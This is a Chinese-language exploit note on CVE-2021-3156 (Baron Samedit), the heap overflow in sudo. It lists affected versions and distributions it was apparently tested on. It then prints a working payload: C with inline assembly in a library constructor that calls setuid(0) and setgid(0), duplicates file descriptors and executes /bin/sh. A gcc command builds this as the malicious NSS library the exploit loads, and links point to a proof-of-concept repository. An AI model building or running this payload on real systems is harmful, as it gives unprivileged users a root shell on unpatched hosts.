# CVE-2021-3156 (Baron Samedit) Sudo 中基于堆的缓冲区溢出漏洞

Qualys研究小组发现了sudo中的堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。

**受影响版本：**

* 从1.8.2到1.8.31p2的所有旧版
* 从1.9.0到1.9.5p1的所有稳定版本

**漏洞测试成功的Linux发行版：**

```bash
Ubuntu 16.04.5 kernel 4.15.0-29-generic
Ubuntu 18.04.1 kernel 4.15.0-20-generic
Ubuntu 19.04 kernel 5.0.0-15-generic
Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic
Linux Mint 19 kernel 4.15.0-20-generic
Xubuntu 16.04.4 kernel 4.13.0-36-generic
ElementaryOS 0.4.1 4.8.0-52-generic
Backbox 6 kernel 4.18.0-21-generic
Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64
Kali kernel 4.19.0-kali5-amd64
Redcore 1806 (LXQT) kernel 4.16.16-redcore
MX 18.3 kernel 4.19.37-2~mx17+1
RHEL 8.0 kernel 4.18.0-80.el8.x86_64
Debian 9.4.0 kernel 4.9.0-6-amd64
Debian 10.0.0 kernel 4.19.0-5-amd64
Devuan 2.0.0 kernel 4.9.0-6-amd64
SparkyLinux 5.8 kernel 4.19.0-5-amd64
Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64
Manjaro 18.0.3 kernel 4.19.23-1-MANJARO
Mageia 6 kernel 4.9.35-desktop-1.mga6
Antergos 18.7 kernel 4.17.6-1-ARCH
```

**EXP：**

```c
static void __attribute__((constructor)) _init(void) {
  __asm __volatile__(
      "addq $64, %rsp;"
      // setuid(0);
      "movq $105, %rax;"
      "movq $0, %rdi;"
      "syscall;"
      // setgid(0);
      "movq $106, %rax;"
      "movq $0, %rdi;"
      "syscall;"
      // dup2(0, 1);
      "movq $33, %rax;"
      "movq $0, %rdi;"
      "movq $1, %rsi;"
      "syscall;"
      // dup2(0, 2);
      "movq $33, %rax;"
      "movq $0, %rdi;"
      "movq $2, %rsi;"
      "syscall;"
      // execve("/bin/sh");
      "movq $59, %rax;"
      "movq $0x0068732f6e69622f, %rdi;"
      "pushq %rdi;"
      "movq %rsp, %rdi;"
      "movq $0, %rdx;"
      "pushq %rdx;"
      "pushq %rdi;"
      "movq %rsp, %rsi;"
      "syscall;"
      // exit(0);
      "movq $60, %rax;"
      "movq $0, %rdi;"
      "syscall;");
}
```

编译：

```
gcc -fpic -shared -nostdlib -o libnss_X/X.so.2 la.c
```

poc：

https://github.com/reverse-ex/CVE-2021-3156

ref：

* https://github.com/reverse-ex/CVE-2021-3156
* https://www.netonlinx.com/archives/59
* https://forum.ywhack.com/thread-115043-1-1.html
* https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
